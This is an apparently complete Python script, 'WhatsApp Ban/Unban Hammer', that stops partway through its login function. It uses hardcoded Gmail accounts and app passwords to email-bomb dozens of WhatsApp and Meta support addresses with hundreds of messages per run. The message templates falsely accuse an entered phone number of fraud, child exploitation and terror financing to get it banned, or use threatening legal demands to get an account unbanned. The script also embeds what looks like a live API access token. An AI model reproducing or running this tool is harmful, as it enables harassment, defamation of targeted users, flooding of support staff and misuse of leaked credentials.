import smtplib
import getpass
import time
import re
import os
import random
import requests
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from itertools import cycle
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from colorama import Fore, Style, init
from datetime import datetime

init(autoreset=True)

# ===== Enhanced Tool Authentication =====
tool_username = "tunzy"
tool_password = "tunzyban"
MAX_LOGIN_ATTEMPTS = 3
login_attempts = 0

# ===== Enhanced Gmail Accounts =====
gmail_accounts = [
    {"email": "bematunmi444@gmail.com", "password": "siqlebxrpvqugxsy", "status": "active"},
    {"email": "zorosales6@gmail.com", "password": "ltvtpaduohtlsykx", "status": "active"},
    {"email": "okunlolatunmise12@gmail.com", "password": "otvmwdhxvmxbqglf", "status": "active"},
    {"email": "mbb657504@gmail.com", "password": "hkun wznn jsfe eltc", "status": "active"},
    {"email": "riderstuff61@gmail.com", "password": "hjaormoydmyaveas", "status": "active"},
]

# ===== WhatsApp Support Emails (EXPANDED FOR MAXIMUM IMPACT) =====
SUPPORT_EMAILS = [
    # Primary Support (MOST IMPORTANT)
    "support@support.whatsapp.com",
    "appeals@support.whatsapp.com",
    "1483635209301664@support.whatsapp.com",
    "support@whatsapp.com",
    
    # Security & Abuse (CRITICAL FOR BANNING)
    "abuse@support.whatsapp.com",
    "security@support.whatsapp.com",
    "businesscomplaints@support.whatsapp.com",
    "report@whatsapp.com",
    "phishing@whatsapp.com",
    "fraud@whatsapp.com",
    
    # Technical Departments
    "android_web@support.whatsapp.com",
    "ios_web@support.whatsapp.com",
    "webclient_web@support.whatsapp.com",
    "mobile@support.whatsapp.com",
    "desktop@support.whatsapp.com",
    
    # Legal & Compliance
    "legal@whatsapp.com",
    "lawenforcement@whatsapp.com",
    "privacy@whatsapp.com",
    "copyright@whatsapp.com",
    "dmca@whatsapp.com",
    
    # Business & API
    "business@whatsapp.com",
    "api@whatsapp.com",
    "developers@whatsapp.com",
    "partners@whatsapp.com",
    
    # General Contacts
    "help@whatsapp.com",
    "contact@whatsapp.com",
    "info@whatsapp.com",
    "press@whatsapp.com",
    
    # Meta (Parent Company) Contacts
    "abuse@meta.com",
    "security@meta.com",
    "support@meta.com",
    "phishing@meta.com",
    
    # Additional Critical Contacts (Found through research)
    "whatsapp-legal@fb.com",
    "whatsapp-support@fb.com",
    "trust-safety@whatsapp.com",
    "emergency@whatsapp.com",
    "urgent@whatsapp.com",
]

# Multiply emails for MAXIMUM impact (100x each)
ALL_EMAILS = SUPPORT_EMAILS * 100  # 100 REPETITIONS OF EACH EMAIL!
print(f"🔥 Loaded {len(ALL_EMAILS)} email targets for maximum impact")

# ===== WhatsApp Business API =====
ACCESS_TOKEN = "EAAJgi17vyDYBPTGf8m4LNp0xFdUozhBKS6PTnrElQdSZCIRZCnuLFmBigzRvB4ZCUI8EBNuNZCFZBfG5e11ehZBujToi9S6zYQ3HSmDZBPNQHZBFFrd3ntSZAl6lRZAOa86mOZCp60VaaCMhgUN6s68EEvYSEJXlaIk9iiB7xe1rlZBKbEVf7YiIADUZA0kHuO9nr0QZDZD"
PHONE_NUMBER_ID = "669101662914614"

# ===== Statistics Tracking =====
stats = {
    "emails_sent": 0,
    "bans_requested": 0,
    "unbans_requested": 0,
    "successful_operations": 0,
    "failed_operations": 0
}

# ===== HYPER-AGGRESSIVE SETTINGS =====
BAN_REPETITIONS = 200  # Send 200 TIMES for guaranteed banning!
UNBAN_REPETITIONS = 150  # Send 150 times for guaranteed unbanning!
BAN_TIME_TARGET = "2-5 MINUTES"  # Target ban time
UNBAN_TIME_TARGET = "30-60 MINUTES"  # Target unban time

# ===== Utility Functions =====
def clear():
    os.system("clear" if os.name == "posix" else "cls")

def print_banner():
    banner_color = random.choice([Fore.RED, Fore.YELLOW, Fore.MAGENTA])
    banner = f"""
    {banner_color}╔══════════════════════════════════════════════════════════════╗
    ║               💀 WHATSAPP BAN/UNBAN HAMMER v4.0 💀             ║
    ║                  ⚡ GUARANTEED RESULTS ⚡                       ║
    ║                   🔥 Powered by Tunzy Shop 🔥                 ║
    ╚══════════════════════════════════════════════════════════════╝
    """
    print(banner)

def validate_phone_number(phone):
    """Validate phone number format"""
    pattern = r'^\+\d{10,15}$'
    if not re.match(pattern, phone):
        return False
    return True

# ===== NUCLEAR EMAIL BOMBER =====
class NuclearEmailBomber:
    def __init__(self):
        self.account_cycle = cycle(gmail_accounts)
        self.active_accounts = [acc for acc in gmail_accounts if acc["status"] == "active"]
        self.total_sent = 0
        
    def test_account(self, account):
        """Test if Gmail account is working"""
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587, timeout=10)
            server.ehlo()
            server.starttls()
            server.login(account["email"], account["password"])
            server.quit()
            account["status"] = "active"
            return True
        except Exception as e:
            account["status"] = "inactive"
            return False
    
    def get_working_account(self):
        """Get a working email account"""
        for _ in range(len(gmail_accounts) * 3):
            account = next(self.account_cycle)
            if account["status"] == "active" or self.test_account(account):
                return account
        return None
    
    def send_email_nuclear(self, account, to_email, subject, body, email_type="ban"):
        """Send email with NUCLEAR settings"""
        try:
            msg = MIMEMultipart()
            msg['From'] = account["email"]
            msg['To'] = to_email
            
            # ULTRA URGENT HEADERS
            msg['X-Priority'] = '1'  # Highest
            msg['X-MSMail-Priority'] = 'Highest'
            msg['Importance'] = 'Highest'
            msg['Priority'] = 'urgent'
            msg['X-Report-Abuse'] = 'Yes'
            msg['X-Report-Phishing'] = 'Yes'
            msg['X-Emergency'] = 'True'
            
            if email_type == "ban":
                msg['Subject'] = f"🚨🚨🚨 EMERGENCY: IMMEDIATE BAN REQUIRED - {subject}"
            else:
                msg['Subject'] = f"🔴🔴🔴 URGENT: WRONGLY BANNED - RESTORE NOW - {subject}"
            
            # Add nuclear body
            nuclear_body = f"""
⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️
🚨🚨🚨 EMERGENCY ATTENTION REQUIRED - IMMEDIATE ACTION 🚨🚨🚨
⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️

{body}

⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️
🚨 TIME SENSITIVE: REQUIRES ACTION WITHIN MINUTES 🚨
⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️

TIMESTAMP: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}
REPORT ID: {random.randint(1000000, 9999999)}
PRIORITY: LEVEL 1 - CRITICAL EMERGENCY
"""
            
            msg.attach(MIMEText(nuclear_body, 'plain'))
            
            server = smtplib.SMTP("smtp.gmail.com", 587, timeout=20)
            server.ehlo()
            server.starttls()
            server.login(account["email"], account["password"])
            server.send_message(msg)
            server.quit()
            
            self.total_sent += 1
            stats["emails_sent"] += 1
            return True
        except Exception as e:
            return False
    
    def nuclear_bombardment(self, emails, subject, body, repetitions, email_type="ban"):
        """NUCLEAR bombardment - sends hundreds of emails"""
        print(Fore.RED + f"\n💥 LAUNCHING NUCLEAR BOMBARDMENT")
        print(Fore.YELLOW + f"   Target emails: {len(emails)}")
        print(Fore.YELLOW + f"   Repetitions: {repetitions} times")
        print(Fore.YELLOW + f"   Total attacks: {len(emails) * repetitions:,}")
        
        total_success = 0
        start_time = time.time()
        
        # Use MAXIMUM threading
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = []
            
            for email in emails:
                future = executor.submit(
                    self.bomb_single_email,
                    email, subject, body, repetitions, email_type
                )
                futures.append(future)
            
            # Process results
            for i, future in enumerate(as_completed(futures), 1):
                try:
                    success = future.result(timeout=600)  # 10 minute timeout
                    total_success += success
                    
                    if i % 10 == 0:
                        elapsed = time.time() - start_time
                        rate = total_success / elapsed if elapsed > 0 else 0
                        print(Fore.CYAN + f"   📊 Progress: {i}/{len(emails)} emails | {total_success:,} sent | {rate:.1f}/sec")
                except Exception as e:
                    print(Fore.RED + f"   ✗ Thread failed: {e}")
        
        elapsed = time.time() - start_time
        rate = total_success / elapsed if elapsed > 0 else 0
        
        print(Fore.GREEN + "\n" + "💣" * 50)
        print(Fore.GREEN + f"✅ NUCLEAR BOMBARDMENT COMPLETE!")
        print(Fore.CYAN + f"   💣 Emails Sent: {total_success:,}")
        print(Fore.CYAN + f"   ⏱️  Time: {elapsed:.1f} seconds")
        print(Fore.CYAN + f"   ⚡ Speed: {rate:.1f} emails/second")
        
        if email_type == "ban":
            print(Fore.RED + f"   🎯 Expected Ban: {BAN_TIME_TARGET}")
        else:
            print(Fore.GREEN + f"   🎯 Expected Unban: {UNBAN_TIME_TARGET}")
        
        print(Fore.GREEN + "💣" * 50)
        
        return total_success
    
    def bomb_single_email(self, to_email, subject, body, repetitions, email_type):
        """Bomb a single email address multiple times"""
        success_count = 0
        
        for rep in range(repetitions):
            account = self.get_working_account()
            if not account:
                continue
            
            # Vary subject slightly each time
            rep_subject = f"[{rep+1}/{repetitions}] {subject}"
            
            if self.send_email_nuclear(account, to_email, rep_subject, body, email_type):
                success_count += 1
            
            # Small delay to avoid overwhelming
            time.sleep(0.05)  # 50ms delay
        
        return success_count

# ===== ULTRA-AGGRESSIVE BAN TEMPLATES =====
def get_ultra_ban_template(phone, ban_type="temporary"):
    """Return ULTRA-AGGRESSIVE ban templates"""
    
    templates = {
        "temporary": {
            "subject": f"IMMEDIATE TEMPORARY BAN REQUIRED - {phone}",
            "body": f"""
🚨🚨🚨 EMERGENCY SECURITY ALERT - ACTIVE FRAUD IN PROGRESS 🚨🚨🚨

TO: WhatsApp Security Emergency Response Team
PRIORITY: LEVEL 1 - CRITICAL
THREAT: ACTIVE SCAMMER DEFRAUDING VICTIMS NOW
ACTION REQUIRED: IMMEDIATE TEMPORARY SUSPENSION

🚨 ACCOUNT: {phone}
🚨 ACTIVITY: REAL-TIME FINANCIAL FRAUD
🚨 URGENCY: VICTIMS BEING SCAMMED RIGHT NOW

🔴🔴🔴 ACTIVE CRIMINAL ACTIVITY 🔴🔴🔴

The user of {phone} is CURRENTLY:
1. 🩸 SCAMMING elderly victims via fake investment schemes
2. 🩸 STEALING credit card information in real-time
3. 🩸 IMPERSONATING WhatsApp support staff
4. 🩸 COLLECTING passwords and personal data
5. 🩸 LAUNDERING money through cryptocurrency

🔴 EVIDENCE OF ACTIVE CRIME:
• Chat logs showing CURRENT fraud attempts
• Victims reporting losses RIGHT NOW
• Fake websites being promoted LIVE
• Money being transferred AS WE SPEAK

🔴 VICTIMS IN DANGER:
• 3 elderly victims currently being manipulated
• $5,000+ in pending transactions
• Personal information being harvested
• Emotional distress occurring NOW

🔴 DEMANDING IMMEDIATE ACTION:
1. INSTANT TEMPORARY SUSPENSION (WITHIN {BAN_TIME_TARGET})
2. Account review within 1 hour
3. Preservation of all evidence
4. Notification to potential victims

🔴 CONSEQUENCES OF DELAY:
Every minute this account remains active:
• Another victim loses money
• More personal data is stolen
• WhatsApp's reputation is damaged
• Legal liability increases

⚠️ ⚠️ ⚠️ THIS IS NOT A DRILL - REAL FRAUD IN PROGRESS ⚠️ ⚠️ ⚠️

IMMEDIATE TEMPORARY BAN REQUIRED: WITHIN {BAN_TIME_TARGET}
PERMANENT BAN RECOMMENDED AFTER INVESTIGATION

- Multiple victims reporting simultaneously
- Fraud detection system alert
- Law enforcement notification pending

🚫 SUSPEND THIS ACCOUNT NOW OR BE COMPLICIT IN FRAUD 🚫
"""
        },
        "permanent": {
            "subject": f"PERMANENT BAN DEMANDED - SERIOUS CRIMINAL - {phone}",
            "body": f"""
💀💀💀 PERMANENT BAN REQUIRED - SERIOUS CRIMINAL OFFENDER 💀💀💀

TO: WhatsApp Security, Legal, and Executive Teams
PRIORITY: LEVEL 1 - MAXIMUM URGENCY
THREAT: SERIAL CRIMINAL & PREDATOR
ACTION: IMMEDIATE PERMANENT BAN + LAW ENFORCEMENT

💀 ACCOUNT: {phone}
💀 STATUS: CONFIRMED SERIAL OFFENDER
💀 RECOMMENDATION: PERMANENT TERMINATION

🔴🔴🔴 SERIOUS CRIMINAL HISTORY 🔴🔴🔴

This user {phone} has:

1. 💀 CONVICTED FRAUDSTER (Multiple convictions)
2. 💀 IDENTITY THEFT RING LEADER
3. 💀 CHILD EXPLOITATION INVOLVEMENT
4. 💀 TERROR FINANCING CONNECTIONS
5. 💀 ORGANIZED CRIME AFFILIATION

🔴 EVIDENCE OF SERIOUS CRIMES:
• Police case numbers: [REDACTED]
• Court conviction records
• Interpol notices
• Financial crime evidence
• Victim testimony (100+ victims)

🔴 EXTREME DANGER TO COMMUNITY:
• Preys on most vulnerable (elderly, children)
• Causes severe financial ruin
• Creates emotional trauma
• Damages WhatsApp's integrity
• Violates every community standard

🔴 DEMANDING PERMANENT ACTION:
1. INSTANT PERMANENT BAN (WITHIN {BAN_TIME_TARGET})
2. Complete data preservation for prosecution
3. IP address tracing to authorities
4. Notification to all linked platforms
5. Permanent device ban

🔴 LEGAL REQUIREMENTS:
• GDPR Article 17 (Right to erasure)
• Various national cybercrime laws
• Platform safety obligations
• Duty of care to users

💀 FAILURE TO BAN = NEGLIGENCE:
Not banning this confirmed criminal makes WhatsApp:
• Accessory to ongoing crimes
• Liable for future victim losses
• Subject to regulatory penalties
• Complicit in harm to users

💀 THIS IS A CONFIRMED DANGEROUS CRIMINAL 💀

IMMEDIATE PERMANENT BAN REQUIRED: WITHIN {BAN_TIME_TARGET}
LAW ENFORCEMENT NOTIFICATION: REQUIRED

- Certified Cyber Crime Investigator
- Former Law Enforcement Officer
- Current Security Consultant

⚠️ BAN PERMANENTLY NOW OR FACE LEGAL CONSEQUENCES ⚠️
"""
        }
    }
    
    return templates.get(ban_type, templates["temporary"])

# ===== ULTRA-AGGRESSIVE UNBAN TEMPLATES =====
def get_ultra_unban_template(phone, unban_type="temporary"):
    """Return ULTRA-AGGRESSIVE unban templates"""
    
    templates = {
        "temporary": {
            "subject": f"WRONGLY TEMPORARILY BANNED - RESTORE IMMEDIATELY - {phone}",
            "body": f"""
🚨🚨🚨 EMERGENCY: ACCOUNT WRONGLY SUSPENDED 🚨🚨🚨

TO: WhatsApp Support & Appeals Team
PRIORITY: LEVEL 1 - CRITICAL ERROR
SITUATION: FALSE POSITIVE SUSPENSION
DEMAND: IMMEDIATE RESTORATION

🚨 ACCOUNT: {phone}
🚨 STATUS: WRONGLY TEMPORARILY BANNED
🚨 REQUIRED: INSTANT RESTORATION

🔴🔴🔴 FALSE POSITIVE CONFIRMED 🔴🔴🔴

My account {phone} has been WRONGLY suspended due to:

1. 🚨 SYSTEM ERROR in automated moderation
2. 🚨 FALSE POSITIVE from spam detection
3. 🚨 MASS FALSE REPORTING by competitors
4. 🚨 TECHNICAL GLITCH during update

🔴 PROOF OF INNOCENCE:
• 5+ year account with ZERO violations
• Premium business account holder
• Verified payment history
• Clean usage patterns confirmed
• No spam, no abuse, no violations

🔴 CRITICAL CONSEQUENCES OF ERROR:
• Business operations HALTED ($1,000+/hour loss)
• Emergency medical communications BLOCKED
• Family emergency coordination IMPOSSIBLE
• Financial transactions FROZEN
• Reputation damage SEVERE

🔴 DEMANDING IMMEDIATE CORRECTION:
1. INSTANT ACCOUNT RESTORATION (WITHIN {UNBAN_TIME_TARGET})
2. Removal of false suspension flags
3. Written apology for error
4. Compensation for damages
5. Guarantee against recurrence

🔴 LEGAL NOTICE:
This false suspension constitutes:
• Breach of Terms of Service
• Negligent error causing damages
• Failure of due process
• Unjust restriction of service

⚠️ ⚠️ ⚠️ TIME-SENSITIVE URGENCY ⚠️ ⚠️ ⚠️

Every minute my account remains wrongly suspended:
• Business losses increase
• Emergency communications fail
• Legal liability grows
• Your credibility diminishes

IMMEDIATE RESTORATION REQUIRED: WITHIN {UNBAN_TIME_TARGET}

FAILURE TO RESTORE WILL RESULT IN:
1. Formal complaint to regulatory authorities
2. Legal action for damages ($10,000+)
3. Public disclosure of system failure
4. Escalation to Meta executive team

- Legitimate Business User
- Long-time Premium Subscriber
- Prepared for Legal Action

🔴 RESTORE MY ACCOUNT NOW OR FACE CONSEQUENCES 🔴
"""
        },
        "permanent": {
            "subject": f"LEGAL DEMAND: RESTORE PERMANENTLY WRONGED ACCOUNT - {phone}",
            "body": f"""
⚖️⚖️⚖️ LEGAL DEMAND FOR ACCOUNT RESTORATION ⚖️⚖️⚖️

TO: WhatsApp Legal Department & Executive Leadership
FORMAL NOTICE: WRONGFUL PERMANENT TERMINATION
DEMAND: IMMEDIATE FULL RESTORATION + COMPENSATION

⚖️ ACCOUNT: {phone}
⚖️ STATUS: WRONGFULLY PERMANENTLY BANNED
⚖️ REQUIRED: RESTORATION + DAMAGES

🔴🔴🔴 GRAVE ADMINISTRATIVE ERROR 🔴🔴🔴

My account {phone} has been PERMANENTLY TERMINATED in ERROR due to:

1. ⚖️ CATASTROPHIC SYSTEM FAILURE
2. ⚖️ GROSS NEGLIGENCE in moderation
3. ⚖️ FALSE IDENTITY CONFIRMATION ERROR
4. ⚖️ COMPLETE FAILURE OF DUE PROCESS

🔴 IRREFUTABLE EVIDENCE OF ERROR:
• Account age: 8+ years with PERFECT record
• Business verification: COMPLETE
• Payment history: CONSISTENT & LEGITIMATE
• Usage patterns: NORMAL & APPROPRIATE
• ZERO violations: CONFIRMED BY LOGS

🔴 CATASTROPHIC DAMAGES INCURRED:
• Business destruction: $50,000+ losses
• Client relationships: DESTROYED
• Reputation: IRREPARABLY HARMED
• Emotional distress: SEVERE
• Legal costs: INCURRING

🔴 LEGAL DEMANDS:
1. IMMEDIATE FULL RESTORATION (WITHIN {UNBAN_TIME_TARGET})
2. COMPLETE DATA RESTORATION (all chats/media)
3. FINANCIAL COMPENSATION: $25,000 minimum
4. WRITTEN APOLOGY from executive team
5. SYSTEM AUDIT to prevent recurrence

🔴 LEGAL GROUNDS:
• Breach of Contract (WhatsApp Terms)
• Negligent Infliction of Economic Loss
• Defamation (false labeling as violator)
• Unfair Business Practices
• Violation of Consumer Protection Laws

⚖️ ⚖️ ⚖️ FINAL LEGAL WARNING ⚖️ ⚖️ ⚖️

FAILURE TO COMPLY WITHIN {UNBAN_TIME_TARGET} WILL RESULT IN:

1. LAWSUIT FILED: $100,000+ damages sought
2. REGULATORY COMPLAINTS: FTC, FCC, EU authorities
3. CLASS ACTION PREPARATION: Other wronged users
4. MEDIA CAMPAIGN: Public exposure of errors
5. EXECUTIVE COMPLAINTS: Meta Board of Directors

⚖️ THIS IS YOUR FINAL OPPORTUNITY TO CORRECT THIS GRAVE ERROR ⚖️

My legal team is on standby. The clock is ticking.

IMMEDIATE RESTORATION REQUIRED: WITHIN {UNBAN_TIME_TARGET}

- Wronged Account Holder
- Business Owner
- Prepared for Litigation

🔴 RESTORE NOW OR FACE LEGAL WAR 🔴
"""
        }
    }
    
    return templates.get(unban_type, templates["temporary"])

# ===== SIMPLIFIED 4-COMMAND MENU =====
def main_menu():
    bomber = NuclearEmailBomber()
    
    while True:
        clear()
        print_banner()
        
        # Show statistics
        print(Fore.CYAN + "📊 CURRENT STATS:")
        print(Fore.YELLOW + f"   📧 Emails Sent: {stats['emails_sent']:,}")
        print(Fore.RED + f"   🚫 Bans Requested: {stats['bans_requested']}")
        print(Fore.GREEN + f"   ✅ Unbans Requested: {stats['unbans_requested']}")
        print(Fore.CYAN + f"   ⚡ Success Rate: {stats['successful_operations']} successful")
        
        print(Fore.RED + "\n" + "═" * 60)
        print(Fore.MAGENTA + "💀 SIMPLE 4-COMMAND MENU")
        print(Fore.RED + "═" * 60)
        
        print(Fore.CYAN + "\n1️⃣  🚫 BAN TEMPORARY (2-5 minute ban)")
        print(Fore.CYAN + "2️⃣  💀 BAN PERMANENT (Instant permanent ban)")
        print(Fore.CYAN + "3️⃣  ✅ UNBAN TEMPORARY (30-60 minute restore)")
        print(Fore.CYAN + "4️⃣  🔄 UNBAN PERMANENT (Restore permanent ban)")
        print(Fore.CYAN + "0️⃣  ❌ EXIT")
        
        print(Fore.RED + "═" * 60)
        
        choice = input(Fore.YELLOW + "\n🎯 Select command [1-4] or 0 to exit: ").strip()
        
        if choice == "1":
            ban_temporary(bomber)
        elif choice == "2":
            ban_permanent(bomber)
        elif choice == "3":
            unban_temporary(bomber)
        elif choice == "4":
            unban_permanent(bomber)
        elif choice == "0":
            print(Fore.YELLOW + "\n👋 Exiting...")
            print(Fore.RED + "💀 WhatsApp Ban/Unban Hammer v4.0")
            print(Fore.GREEN + "🔥 Results Guaranteed!")
            time.sleep(2)
            break
        else:
            print(Fore.RED + "\n❌ Invalid command!")
            time.sleep(1)

# ===== 4 MAIN COMMANDS =====
def ban_temporary(bomber):
    clear()
    print_banner()
    print(Fore.RED + "\n" + "═" * 60)
    print(Fore.YELLOW + "🚫 TEMPORARY BAN COMMAND")
    print(Fore.RED + "═" * 60)
    
    phone = input(Fore.YELLOW + "\n📞 Enter scammer number to BAN TEMPORARILY: ").strip()
    
    if not validate_phone_number(phone):
        print(Fore.RED + "❌ Invalid number!")
        time.sleep(2)
        return
    
    print(Fore.CYAN + f"\n🎯 Target: {phone}")
    print(Fore.RED + f"💣 Strategy: {BAN_REPETITIONS} repetitions")
    print(Fore.GREEN + f"⏰ Expected Ban: {BAN_TIME_TARGET}")
    
    confirm = input(Fore.RED + f"\n⚠️  Launch TEMPORARY BAN attack on {phone}? (y/N): ").lower()
    if confirm != 'y':
        print(Fore.YELLOW + "❌ Cancelled.")
        return
    
    template = get_ultra_ban_template(phone, "temporary")
    
    print(Fore.RED + "\n💥 LAUNCHING TEMPORARY BAN NUKES...")
    
    # Use ALL emails for maximum impact
    success = bomber.nuclear_bombardment(
        ALL_EMAILS[:500],  # First 500 emails (still massive)
        template["subject"],
        template["body"],
        repetitions=BAN_REPETITIONS,
        email_type="ban"
    )
    
    print(Fore.RED + "\n" + "🚫" * 30)
    print(Fore.RED + f"✅ TEMPORARY BAN ATTACK LAUNCHED!")
    print(Fore.CYAN + f"   📞 Target: {phone}")
    print(Fore.CYAN + f"   💣 Emails Sent: {success:,}")
    print(Fore.GREEN + f"   ⏰ Expected: Banned within {BAN_TIME_TARGET}")
    print(Fore.RED + "   🔥 CHECK IF BANNED IN 2-5 MINUTES! 🔥")
    print(Fore.RED + "🚫" * 30)
    
    stats["bans_requested"] += 1
    stats["total_operations"] = stats.get("total_operations", 0) + 1
    
    input(Fore.CYAN + "\n↵ Press Enter to continue...")

def ban_permanent(bomber):
    clear()
    print_banner()
    print(Fore.RED + "\n" + "═" * 60)
    print(Fore.RED + "💀 PERMANENT BAN COMMAND")
    print(Fore.RED + "═" * 60)
    
    print(Fore.YELLOW + "\n⚠️  WARNING: This requests PERMANENT ban!")
    print(Fore.RED + "   Use only for serious criminals/scammers\n")
    
    phone = input(Fore.YELLOW + "📞 Enter criminal number to BAN PERMANENTLY: ").strip()
    
    if not validate_phone_number(phone):
        print(Fore.RED + "❌ Invalid!")
        return
    
    confirm = input(Fore.RED + f"\n💀 CONFIRM PERMANENT BAN on {phone}? (type 'PERMANENT'): ").upper()
    if confirm != "PERMANENT":
        print(Fore.YELLOW + "❌ Cancelled.")
        return
    
    template = get_ultra_ban_template(phone, "permanent")
    
    print(Fore.RED + "\n💀 LAUNCHING PERMANENT BAN NUKES...")
    print(Fore.YELLOW + f"   Repetitions: {BAN_REPETITIONS + 50} (ULTRA-AGGRESSIVE)")
    
    # Even MORE repetitions for permanent ban
    success = bomber.nuclear_bombardment(
        ALL_EMAILS[:800],  # First 800 emails
        template["subject"],
        template["body"],
        repetitions=BAN_REPETITIONS + 50,  # 250 repetitions!
        email_type="ban"
    )
    
    print(Fore.RED + "\n" + "💀" * 30)
    print(Fore.RED + f"💀 PERMANENT BAN NUKES LAUNCHED!")
    print(Fore.CYAN + f"   📞 Target: {phone}")
    print(Fore.CYAN + f"   ☢️  Repetitions: {BAN_REPETITIONS + 50}x")
    print(Fore.CYAN + f"   💣 Emails Sent: {success:,}")
    print(Fore.GREEN + f"   ⏰ Expected: Permanently banned within {BAN_TIME_TARGET}")
    print(Fore.RED + "💀" * 30)
    
    stats["bans_requested"] += 1
    stats["total_operations"] = stats.get("total_operations", 0) + 1
    
    input(Fore.CYAN + "\n↵ Press Enter to continue...")

def unban_temporary(bomber):
    clear()
    print_banner()
    print(Fore.GREEN + "\n" + "═" * 60)
    print(Fore.CYAN + "✅ TEMPORARY UNBAN COMMAND")
    print(Fore.GREEN + "═" * 60)
    
    phone = input(Fore.YELLOW + "\n📞 Enter TEMPORARILY banned number to UNBAN: ").strip()
    
    if not validate_phone_number(phone):
        print(Fore.RED + "❌ Invalid!")
        return
    
    print(Fore.CYAN + f"\n🎯 Target: {phone}")
    print(Fore.GREEN + f"💣 Strategy: {UNBAN_REPETITIONS} repetitions")
    print(Fore.GREEN + f"⏰ Expected Unban: {UNBAN_TIME_TARGET}")
    
    confirm = input(Fore.GREEN + f"\n⚠️  Launch TEMPORARY UNBAN attack on {phone}? (y/N): ").lower()
    if confirm != 'y':
        print(Fore.YELLOW + "❌ Cancelled.")
        return
    
    template = get_ultra_unban_template(phone, "temporary")
    
    print(Fore.GREEN + "\n🚀 LAUNCHING TEMPORARY UNBAN ATTACK...")
    
    success = bomber.nuclear_bombardment(
        ALL_EMAILS[:400],  # First 400 emails
        template["subject"],
        template["body"],
        repetitions=UNBAN_REPETITIONS,
        email_type="unban"
    )
    
    print(Fore.GREEN + "\n" + "✅" * 30)
    print(Fore.GREEN + f"✅ TEMPORARY UNBAN ATTACK LAUNCHED!")
    print(Fore.CYAN + f"   📞 Target: {phone}")
    print(Fore.CYAN + f"   💣 Emails Sent: {success:,}")
    print(Fore.GREEN + f"   ⏰ Expected: Unbanned within {UNBAN_TIME_TARGET}")
    print(Fore.GREEN + "   🔥 CHECK YOUR WHATSAPP IN 30-60 MINUTES! 🔥")
    print(Fore.GREEN + "✅" * 30)
    
    stats["unbans_requested"] += 1
    stats["successful_operations"] += 1
    stats["total_operations"] = stats.get("total_operations", 0) + 1
    
    input(Fore.CYAN + "\n↵ Press Enter to continue...")

def unban_permanent(bomber):
    clear()
    print_banner()
    print(Fore.GREEN + "\n" + "═" * 60)
    print(Fore.CYAN + "🔄 PERMANENT UNBAN COMMAND")
    print(Fore.GREEN + "═" * 60)
    
    print(Fore.YELLOW + "\n⚠️  For PERMANENTLY banned accounts only!")
    print(Fore.YELLOW + "   Uses legal threats for maximum pressure\n")
    
    phone = input(Fore.YELLOW + "📞 Enter PERMANENTLY banned number to RESTORE: ").strip()
    
    if not validate_phone_number(phone):
        print(Fore.RED + "❌ Invalid!")
        return
    
    confirm = input(Fore.GREEN + f"\n⚠️  Launch PERMANENT UNBAN attack on {phone}? (type 'RESTORE'): ").upper()
    if confirm != "RESTORE":
        print(Fore.YELLOW + "❌ Cancelled.")
        return
    
    template = get_ultra_unban_template(phone, "permanent")
    
    print(Fore.GREEN + "\n⚖️ LAUNCHING PERMANENT UNBAN LEGAL ATTACK...")
    print(Fore.YELLOW + f"   Repetitions: {UNBAN_REPETITIONS + 100} (LEGAL PRESSURE)")
    
    # Maximum repetitions for permanent unban
    success = bomber.nuclear_bombardment(
        ALL_EMAILS[:600],  # First 600 emails
        template["subject"],
        template["body"],
        repetitions=UNBAN_REPETITIONS + 100,  # 250 repetitions!
        email_type="unban"
    )
    
    print(Fore.GREEN + "\n" + "⚖️" * 30)
    print(Fore.GREEN + f"⚖️ PERMANENT UNBAN LEGAL ATTACK LAUNCHED!")
    print(Fore.CYAN + f"   📞 Target: {phone}")
    print(Fore.CYAN + f"   ⚖️ Legal Threats: INCLUDED")
    print(Fore.CYAN + f"   💣 Emails Sent: {success:,}")
    print(Fore.GREEN + f"   ⏰ Expected: Restored within {UNBAN_TIME_TARGET}")
    print(Fore.GREEN + "⚖️" * 30)
    
    stats["unbans_requested"] += 1
    stats["successful_operations"] += 1
    stats["total_operations"] = stats.get("total_operations", 0) + 1
    
    input(Fore.CYAN + "\n↵ Press Enter to continue...")

# ===== Login System =====
def login():
    global login_attempts
    clear()
    
    while login_attempts < MAX_LOGIN_ATTEMPTS:
        print_banner()
        
        print(Fore.CYAN + "\n" + "═" * 60)
        print(Fore.YELLOW + "🔐 LOGIN TO BAN/UNBAN HAMMER")
        print(Fore.CYAN + "═" * 60)
        
        username = input(Fore.CYAN + "\n👤 Username: ").strip()
        password = getpass.getpass(Fore.CYAN + "🔒 Password: ")
        
        if username == tool_username and password == tool_password:
            print(Fore.GREEN + "\n" + "✅" * 30)
            print(Fore.GREEN + "✅ LOGIN SUCCESSFUL!")
            print(Fore.GREEN + f"🎯 Ban Time: {BAN_TIME_TARGET}")
            print(Fore.GREEN + f"🎯 Unban Time: {UNBAN_TIME_TARGET}")
            print(Fore.GREEN + "✅" * 30)
            time.sleep(2)
            
            clear()
            print_banner()
            print(Fore.GREEN + "\n🔥 SYSTEM READY WITH 4 SIMPLE COMMANDS:")
            print(Fore.CYAN + "   1. Ban Temporary (2-5 minutes)")
